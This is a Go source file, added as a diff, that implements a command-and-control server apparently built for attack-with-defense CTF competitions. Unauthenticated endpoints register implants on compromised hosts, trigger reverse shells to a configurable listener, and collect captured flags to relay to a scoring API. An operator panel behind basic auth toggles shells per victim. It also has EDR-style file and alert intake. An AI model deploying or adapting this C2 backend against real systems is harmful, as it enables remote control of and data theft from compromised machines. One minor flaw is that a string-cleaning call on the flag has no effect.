@@ -1,0 +1,714 @@
+package main
+
+import (
+	"crypto/subtle"
+	"database/sql"
+	"embed"
+	"encoding/base64"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"io/fs"
+	"io/ioutil"
+	"log"
+	"net"
+	"net/http"
+	"os"
+	"path/filepath"
+	"strconv"
+	"strings"
+	"time"
+
+	_ "modernc.org/sqlite" // sqlite3要使用cgo, 没法静态编译, 不考虑
+)
+
+type Client struct {
+	IP          string `json:"ip"`
+	Hostname    string `json:"hostname"`
+	Username    string `json:"username"`
+	ProcessName string `json:"process_name"`
+	PID         string `json:"pid"`
+	LastSeen    string `json:"last_seen"`
+	RevShell    int    `json:"revshell"`
+}
+
+type Message struct {
+	Timestamp   int64  `json:"timestamp"`
+	MessageType string `json:"message_type"` // warning, info, success
+	Title       string `json:"title"`
+	Content     string `json:"content"`
+}
+
+type HeartbeatData struct {
+	Hostname    string `json:"hostname"`
+	Username    string `json:"username"`
+	ProcessPID  string `json:"pid"`
+	ProcessName string `json:"process_name"`
+}
+
+type SuspiciousFile struct {
+	Filename string `json:"filename"`
+	Path     string `json:"path"`
+	Content  string `json:"content"`
+}
+
+var (
+	db *sql.DB
+)
+
+var (
+	username = flag.String("u", "0rays", "用户名")
+	password = flag.String("p", "", "密码")
+	port     = flag.String("P", "26666", "监听端口")
+)
+
+const (
+	maxFileSize  = 10 * 1024 * 1024
+	dialTimeout  = 10 * time.Second
+	writeTimeout = 10 * time.Second
+	readTimeout  = 10 * time.Second
+)
+
+func initDB() error {
+	var err error
+	db, err = sql.Open("sqlite", "./awd-server.db?_busy_timeout=10000&_journal_mode=WAL&_synchronous=NORMAL&_cache_size=1000")
+	if err != nil {
+		return err
+	}
+
+	db.SetMaxOpenConns(1)
+	db.SetMaxIdleConns(1)
+
+	schemas := []string{
+		`CREATE TABLE IF NOT EXISTS clients (
+			ip TEXT PRIMARY KEY,
+			hostname TEXT,
+			username TEXT,
+			process_name TEXT,
+			pid TEXT,
+			last_seen TEXT,
+			revshell INTEGER DEFAULT 0
+		)`,
+		`CREATE TABLE IF NOT EXISTS messages (
+			timestamp INTEGER PRIMARY KEY,
+			message_type TEXT,
+			title TEXT,
+			content TEXT
+		)`,
+		`CREATE TABLE IF NOT EXISTS config (
+			key TEXT PRIMARY KEY,
+			value TEXT
+		)`,
+	}
+
+	for _, schema := range schemas {
+		if _, err := db.Exec(schema); err != nil {
+			return err
+		}
+	}
+
+	defaultConfigs := map[string]string{
+		"revshell_addr":   "127.0.0.1|1337",
+		"flag_api_ip":     "127.0.0.1",
+		"flag_api_port":   "80",
+		"submit_template": "GET /submit?flag={FLAG} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nUser-Agent: curl/8.13.0\r\nAccept: */*\r\n\r\n",
+	}
+
+	for key, value := range defaultConfigs {
+		_, err := db.Exec("INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)", key, value)
+		if err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
+
+func getClientIP(r *http.Request) string {
+	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
+	return strings.TrimSpace(ip)
+}
+
+func addMessage(msgType, title, content string) {
+	timestamp := time.Now().UnixNano()
+	_, err := db.Exec("INSERT INTO messages (timestamp, message_type, title, content) VALUES (?, ?, ?, ?)",
+		timestamp, msgType, title, content)
+	if err != nil {
+		log.Printf("增加消息失败: %v", err)
+	}
+}
+
+func getConfigValue(key string) string {
+	var value string
+	err := db.QueryRow("SELECT value FROM config WHERE key = ?", key).Scan(&value)
+	if err != nil {
+		log.Printf("获取配置失败 %s: %v", key, err)
+		return ""
+	}
+	return value
+}
+
+func setConfigValue(key, value string) error {
+	_, err := db.Exec("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", key, value)
+	return err
+}
+
+func submitFlagToCompetition(flag string, clientIP string) {
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				log.Printf("提交flag时出现问题: %v", r)
+			}
+		}()
+
+		template := getConfigValue("submit_template")
+		if template == "" {
+			log.Printf("来自 %s 的Flag: %s, 错误: 提交模板未配置", clientIP, flag)
+			addMessage("warning", "Flag提交失败", fmt.Sprintf("来自 %s 的Flag: %s, 错误: 提交模板未配置", clientIP, flag))
+			return
+		}
+
+		apiIP := getConfigValue("flag_api_ip")
+		apiPort := getConfigValue("flag_api_port")
+
+		if apiIP == "" || apiPort == "" {
+			log.Printf("来自 %s 的Flag: %s, 错误: 提交API未设置", clientIP, flag)
+			addMessage("warning", "Flag提交失败", fmt.Sprintf("来自 %s 的Flag: %s, 错误: 提交API未设置", clientIP, flag))
+			return
+		}
+
+		time.Sleep(90 * time.Second)
+		strings.ReplaceAll(flag, "\\n", "")
+		request := strings.ReplaceAll(template, "{FLAG}", flag)
+		request = strings.ReplaceAll(request, "{HOST}", apiIP)
+		request = strings.ReplaceAll(request, "{PORT}", apiPort)
+
+		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", apiIP, apiPort), dialTimeout)
+		if err != nil {
+			log.Printf("来自 %s 的Flag: %s, 错误: 连接失败: %v", clientIP, flag, err)
+			addMessage("warning", "Flag提交失败", fmt.Sprintf("来自 %s 的Flag: %s, 错误: 连接失败: %v", clientIP, flag, err))
+			return
+		}
+		defer conn.Close()
+
+		if err := conn.SetWriteDeadline(time.Now().Add(writeTimeout)); err != nil {
+			log.Printf("来自 %s 的Flag: %s, 错误: 设置超时失败: %v", clientIP, flag, err)
+			addMessage("warning", "Flag提交失败", fmt.Sprintf("来自 %s 的Flag: %s, 错误: 设置超时失败: %v", clientIP, flag, err))
+			return
+		}
+
+		_, err = conn.Write([]byte(request))
+		if err != nil {
+			log.Printf("来自 %s 的Flag: %s, 错误: 发送失败: %v", clientIP, flag, err)
+			addMessage("warning", "Flag提交失败", fmt.Sprintf("来自 %s 的Flag: %s, 错误: 发送失败: %v", clientIP, flag, err))
+			return
+		}
+
+		if err := conn.SetReadDeadline(time.Now().Add(readTimeout)); err != nil {
+			log.Printf("设置read超时失败: %v", err)
+		}
+
+		buffer := make([]byte, 1024)
+		if n, err := conn.Read(buffer); err == nil && n > 0 {
+			log.Printf("Flag提交API的响应: %s", string(buffer[:n]))
+		}
+
+		log.Printf("成功提交来自 %s 的Flag: %s", clientIP, flag)
+		addMessage("success", "Flag已提交", fmt.Sprintf("成功提交来自 %s 的Flag: %s", clientIP, flag))
+	}()
+}
+
+func submitFlag(w http.ResponseWriter, r *http.Request) {
+	flag := r.URL.Query().Get("flag")
+	if flag == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	clientIP := getClientIP(r)
+	log.Printf("已提交来自 %s 的Flag: %s", clientIP, flag)
+
+	submitFlagToCompetition(flag, clientIP)
+
+	w.WriteHeader(http.StatusOK)
+}
+
+func heartbeat(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		return
+	}
+
+	clientIP := getClientIP(r)
+
+	var heartbeatData HeartbeatData
+	decoder := json.NewDecoder(r.Body)
+	if err := decoder.Decode(&heartbeatData); err != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	var existingIP string
+	err := db.QueryRow("SELECT ip FROM clients WHERE ip = ?", clientIP).Scan(&existingIP)
+
+	if err == sql.ErrNoRows {
+		_, err = db.Exec(`INSERT INTO clients (ip, hostname, username, process_name, pid, last_seen, revshell) 
+			VALUES (?, ?, ?, ?, ?, ?, 0)`,
+			clientIP, heartbeatData.Hostname, heartbeatData.Username,
+			heartbeatData.ProcessName, heartbeatData.ProcessPID, time.Now().Format(time.RFC3339))
+
+		if err != nil {
+			log.Printf("添加新客户端失败: %v", err)
+			w.WriteHeader(http.StatusInternalServerError)
+			return
+		}
+
+		addMessage("info", "新客户端上线", fmt.Sprintf("IP: %s, 主机: %s", clientIP, heartbeatData.Hostname))
+	} else if err != nil {
+		// Database error
+		log.Printf("查询客户端失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	} else {
+		_, err = db.Exec(`UPDATE clients SET hostname=?, username=?, process_name=?, pid=?, last_seen=? WHERE ip=?`,
+			heartbeatData.Hostname, heartbeatData.Username, heartbeatData.ProcessName,
+			heartbeatData.ProcessPID, time.Now().Format(time.RFC3339), clientIP)
+
+		if err != nil {
+			log.Printf("更新客户端失败: %v", err)
+			w.WriteHeader(http.StatusInternalServerError)
+			return
+		}
+	}
+
+	var revShell int
+	err = db.QueryRow("SELECT revshell FROM clients WHERE ip = ?", clientIP).Scan(&revShell)
+	if err != nil {
+		log.Printf("获取反弹shell状态失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	if revShell == 1 {
+		_, err = db.Exec("UPDATE clients SET revshell = 0 WHERE ip = ?", clientIP)
+		if err != nil {
+			log.Printf("设置反弹shell状态失败: %v", err)
+		}
+	}
+
+	w.Header().Set("Content-Type", "text/plain")
+	fmt.Fprintf(w, "%d", revShell)
+}
+
+func getReverseShell(w http.ResponseWriter, r *http.Request) {
+	addr := getConfigValue("revshell_addr")
+	w.Header().Set("Content-Type", "text/plain")
+	fmt.Fprint(w, addr)
+}
+
+func edrAlert(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		return
+	}
+
+	alertType := r.URL.Query().Get("type")
+	message := r.URL.Query().Get("message")
+
+	if alertType == "" || message == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("type and message parameters are required"))
+		return
+	}
+
+	// Validate alert type
+	if alertType != "warning" && alertType != "info" && alertType != "success" {
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("type must be warning, info, or success"))
+		return
+	}
+
+	clientIP := getClientIP(r)
+	title := "EDR消息"
+	content := fmt.Sprintf("来源: %s, 消息: %s", clientIP, message)
+
+	addMessage(alertType, title, content)
+	log.Printf("EDR告警 %s: [%s] %s", clientIP, alertType, message)
+
+	w.WriteHeader(http.StatusOK)
+}
+
+func edrSuspiciousFile(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		return
+	}
+
+	var suspFile SuspiciousFile
+	decoder := json.NewDecoder(r.Body)
+	if err := decoder.Decode(&suspFile); err != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	if suspFile.Filename == "" || suspFile.Path == "" || suspFile.Content == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("filename, path, and content are required"))
+		return
+	}
+
+	filename := filepath.Base(suspFile.Filename)
+	if filename == "" || filename == "." || filename == ".." {
+		log.Printf("文件名不合法: %s", suspFile.Filename)
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("Invalid filename"))
+		return
+	}
+
+	if len(suspFile.Content) > maxFileSize*4/3 { // base64 is ~33% larger
+		log.Printf("文件过大: %d bytes (base64)", len(suspFile.Content))
+		w.WriteHeader(http.StatusRequestEntityTooLarge)
+		w.Write([]byte("File too large"))
+		return
+	}
+
+	content, err := base64.StdEncoding.DecodeString(suspFile.Content)
+	if err != nil {
+		log.Printf("base64解码失败: %v", err)
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("Invalid base64 content"))
+		return
+	}
+
+	if len(content) > maxFileSize {
+		log.Printf("解码后的文件太大: %d bytes", len(content))
+		w.WriteHeader(http.StatusRequestEntityTooLarge)
+		w.Write([]byte("Decoded file too large"))
+		return
+	}
+
+	edrDir := "./edr_files"
+	if err := os.MkdirAll(edrDir, 0755); err != nil {
+		log.Printf("创建edr_files文件夹失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	timestamp := time.Now().UnixNano()
+	safeFilename := fmt.Sprintf("%d-%s", timestamp, filename)
+	filePath := filepath.Join(edrDir, safeFilename)
+
+	if err := ioutil.WriteFile(filePath, content, 0644); err != nil {
+		log.Printf("保存可疑文件失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	clientIP := getClientIP(r)
+	log.Printf("从 %s 获得了可疑文件: %s 路径: %s (%d bytes)",
+		clientIP, suspFile.Filename, suspFile.Path, len(content))
+
+	w.WriteHeader(http.StatusOK)
+}
+
+func getMessages(w http.ResponseWriter, r *http.Request) {
+	rows, err := db.Query("SELECT timestamp, message_type, title, content FROM messages ORDER BY timestamp DESC")
+	if err != nil {
+		log.Printf("查询消息失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+	defer rows.Close()
+
+	var messages []Message
+	for rows.Next() {
+		var msg Message
+		err := rows.Scan(&msg.Timestamp, &msg.MessageType, &msg.Title, &msg.Content)
+		if err != nil {
+			log.Printf("扫描消息失败: %v", err)
+			continue
+		}
+		messages = append(messages, msg)
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(messages)
+}
+
+func clearMessages(w http.ResponseWriter, r *http.Request) {
+	_, err := db.Exec("DELETE FROM messages")
+	if err != nil {
+		log.Printf("清理消息失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	addMessage("info", "消息已清理", "所有历史消息已清除")
+	w.WriteHeader(http.StatusOK)
+}
+
+func getClients(w http.ResponseWriter, r *http.Request) {
+	rows, err := db.Query("SELECT ip, hostname, username, process_name, pid, last_seen, revshell FROM clients ORDER BY last_seen DESC")
+	if err != nil {
+		log.Printf("查询客户端失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+	defer rows.Close()
+
+	var clients []Client
+	for rows.Next() {
+		var client Client
+		err := rows.Scan(&client.IP, &client.Hostname, &client.Username,
+			&client.ProcessName, &client.PID, &client.LastSeen, &client.RevShell)
+		if err != nil {
+			log.Printf("扫描客户端失败: %v", err)
+			continue
+		}
+		clients = append(clients, client)
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(clients)
+}
+
+func setClient(w http.ResponseWriter, r *http.Request) {
+	ip := r.URL.Query().Get("ip")
+	revShellStr := r.URL.Query().Get("revshell")
+
+	if ip == "" || revShellStr == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	revShell, err := strconv.Atoi(revShellStr)
+	if err != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	if revShell != 0 && revShell != 1 {
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("revshell must be 0 or 1"))
+		return
+	}
+
+	_, err = db.Exec("UPDATE clients SET revshell = ? WHERE ip = ?", revShell, ip)
+	if err != nil {
+		log.Printf("更新客户端反弹shell信息失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	action := "禁用"
+	if revShell == 1 {
+		action = "启用"
+	}
+	addMessage("info", "客户端状态更新", fmt.Sprintf("IP: %s, 反弹Shell: %s", ip, action))
+	w.WriteHeader(http.StatusOK)
+}
+
+func setReverseShell(w http.ResponseWriter, r *http.Request) {
+	addr := r.URL.Query().Get("addr")
+	if addr == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	if err := setConfigValue("revshell_addr", addr); err != nil {
+		log.Printf("设置反弹shell地址失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	addMessage("info", "反弹Shell地址更新", fmt.Sprintf("新地址: %s", addr))
+	w.WriteHeader(http.StatusOK)
+}
+
+func setFlagAPI(w http.ResponseWriter, r *http.Request) {
+	ip := r.URL.Query().Get("ip")
+	port := r.URL.Query().Get("port")
+
+	if ip == "" || port == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	if _, err := strconv.Atoi(port); err != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	if err := setConfigValue("flag_api_ip", ip); err != nil {
+		log.Printf("设置Flag提交API信息失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	if err := setConfigValue("flag_api_port", port); err != nil {
+		log.Printf("设置Flag提交API信息失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	addMessage("info", "Flag API更新", fmt.Sprintf("新地址: %s:%s", ip, port))
+	w.WriteHeader(http.StatusOK)
+}
+
+func getTemplate(w http.ResponseWriter, r *http.Request) {
+	template := getConfigValue("submit_template")
+	w.Header().Set("Content-Type", "text/plain")
+	w.Write([]byte(template))
+}
+
+func editTemplate(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		return
+	}
+
+	body, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		log.Printf("读取request body失败: %v", err)
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	template := string(body)
+	if template == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	if !strings.Contains(template, "{FLAG}") {
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("Template must contain {FLAG} placeholder"))
+		return
+	}
+
+	if err := setConfigValue("submit_template", template); err != nil {
+		log.Printf("设置提交模板失败: %v", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	addMessage("info", "提交模板更新", "Flag提交模板已更新，支持 {FLAG}, {HOST}, {PORT} 占位符")
+	w.WriteHeader(http.StatusOK)
+}
+
+func basicAuth(next http.HandlerFunc) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		auth := r.Header.Get("Authorization")
+		if auth == "" {
+			w.Header().Set("WWW-Authenticate", `Basic realm=""`)
+			w.WriteHeader(http.StatusUnauthorized)
+			w.Write([]byte("Unauthorized"))
+			return
+		}
+
+		if !strings.HasPrefix(auth, "Basic ") {
+			w.WriteHeader(http.StatusUnauthorized)
+			w.Write([]byte("Invalid authentication method"))
+			return
+		}
+
+		payload, err := base64.StdEncoding.DecodeString(auth[6:])
+		if err != nil {
+			w.WriteHeader(http.StatusUnauthorized)
+			w.Write([]byte("Invalid base64 encoding"))
+			return
+		}
+
+		pair := strings.SplitN(string(payload), ":", 2)
+		if len(pair) != 2 {
+			w.WriteHeader(http.StatusUnauthorized)
+			w.Write([]byte("Invalid credentials format"))
+			return
+		}
+
+		user, pass := pair[0], pair[1]
+		usernameMatch := subtle.ConstantTimeCompare([]byte(user), []byte(*username)) == 1
+		passwordMatch := subtle.ConstantTimeCompare([]byte(pass), []byte(*password)) == 1
+
+		if !usernameMatch || !passwordMatch {
+			w.Header().Set("WWW-Authenticate", `Basic realm=""`)
+			w.WriteHeader(http.StatusUnauthorized)
+			w.Write([]byte("Invalid credentials"))
+			return
+		}
+
+		next(w, r)
+	}
+}
+
+// static/下的所有文件都是嵌入到可执行文件中的,注意不要放敏感内容进去
+//go:embed static/*
+var staticFiles embed.FS
+
+func main() {
+	flag.Parse()
+
+	if *password == "" {
+		log.Fatal("需要 -p 指定密码")
+	}
+
+	if _, err := strconv.Atoi(*port); err != nil {
+		log.Fatalf("端口错误: %s", *port)
+	}
+
+	if err := initDB(); err != nil {
+		log.Fatalf("加载数据库错误: %v", err)
+	}
+	defer db.Close()
+
+	subFS, err := fs.Sub(staticFiles, "static")
+	if err != nil {
+		panic(err)
+	}
+
+	mux := http.NewServeMux()
+
+	mux.Handle("/", http.FileServer(http.FS(subFS)))
+
+	mux.HandleFunc("/api/c2/submit-flag", submitFlag)
+	mux.HandleFunc("/api/c2/heartbeat", heartbeat)
+	mux.HandleFunc("/api/c2/get-rs", getReverseShell)
+
+	mux.HandleFunc("/api/agent/edr-alert", edrAlert)
+	mux.HandleFunc("/api/agent/edr-suspicious-file", edrSuspiciousFile)
+
+	mux.HandleFunc("/api/browser/messages", basicAuth(getMessages))
+	mux.HandleFunc("/api/browser/clearmessage", basicAuth(clearMessages))
+	mux.HandleFunc("/api/browser/getclients", basicAuth(getClients))
+	mux.HandleFunc("/api/browser/set-client", basicAuth(setClient))
+	mux.HandleFunc("/api/browser/set-rs", basicAuth(setReverseShell))
+	mux.HandleFunc("/api/browser/set-flag-api", basicAuth(setFlagAPI))
+	mux.HandleFunc("/api/browser/get-template", basicAuth(getTemplate))
+	mux.HandleFunc("/api/browser/edit-template", basicAuth(editTemplate))
+
+	srv := &http.Server{
+		Addr:              ":" + *port,
+		Handler:           mux,
+		ReadHeaderTimeout: 5 * time.Second,
+		ReadTimeout:       10 * time.Second,
+		WriteTimeout:      10 * time.Second,
+		IdleTimeout:       60 * time.Second,
+	}
+
+	logo := `   ___  _____        __     _______         __          _______  
+  / _ \|  __ \     /\\ \   / / ____|       /\ \        / /  __ \ 
+ | | | | |__) |   /  \\ \_/ / (___ ______ /  \ \  /\  / /| |  | |
+ | | | |  _  /   / /\ \\   / \___ \______/ /\ \ \/  \/ / | |  | |
+ | |_| | | \ \  / ____ \| |  ____) |    / ____ \  /\  /  | |__| |
+  \___/|_|  \_\/_/    \_\_| |_____/    /_/    \_\/  \/   |_____/ 
+                                                                 
+                                                                 `
+	fmt.Println(logo)
+	log.Printf("AWD消息中台启动，监听端口 %s", *port)
+	log.Printf("认证信息 - 用户名: %s", *username)
+	log.Printf("EDR文件大小限制: %d MB", maxFileSize/(1024*1024))
+
+	if err := srv.ListenAndServe(); err != nil {
+		log.Fatalf("服务启动失败: %v", err)
+	}
+}
